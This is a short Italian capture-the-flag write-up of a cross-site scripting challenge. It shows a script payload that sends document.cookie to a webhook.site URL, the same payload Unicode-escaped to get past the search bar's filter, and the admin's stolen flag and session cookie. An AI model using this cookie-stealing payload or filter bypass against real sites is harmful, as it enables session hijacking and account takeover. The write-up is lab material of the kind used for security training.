Dopo tanti tentativi ho scoperto che la barra di ricerca non sanitizza i caratteri UNICODE.

Quindi costruendo un payload di questo tipo

```jsx
<script>
fetch(https://webhook.site/e4d7925a-59d4-477a-9806-69bba38a288b?c=${document.cookie})
</script>
```

e traducendolo in caratteri UNICODE otteniamo

```jsx
\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u000a\u0066\u0065\u0074\u0063\u0068\u0028\u0060\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u002e\u0073\u0069\u0074\u0065\u002f\u0065\u0034\u0064\u0037\u0039\u0032\u0035\u0061\u002d\u0035\u0039\u0064\u0034\u002d\u0034\u0037\u0037\u0061\u002d\u0039\u0038\u0030\u0036\u002d\u0036\u0039\u0062\u0062\u0061\u0033\u0038\u0061\u0032\u0038\u0038\u0062\u003f\u0063\u003d\u0024\u007b\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u006f\u006f\u006b\u0069\u0065\u007d\u0060\u0029\u000a\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e
```

Incolliamo questo code nella barra di ricerca.

Copiamo il link e reportiamolo all’admin. Su webhook troviamo la flag 

```jsx
flag=CCIT{f736c0e5df335092f93fe999377c766d?}; session=eyJ1c2VybmFtZSI6ImFkbWluIn0.Z8dvmQ.4f6PP0tUpqTXKDv0YRRRmpLKsXI
```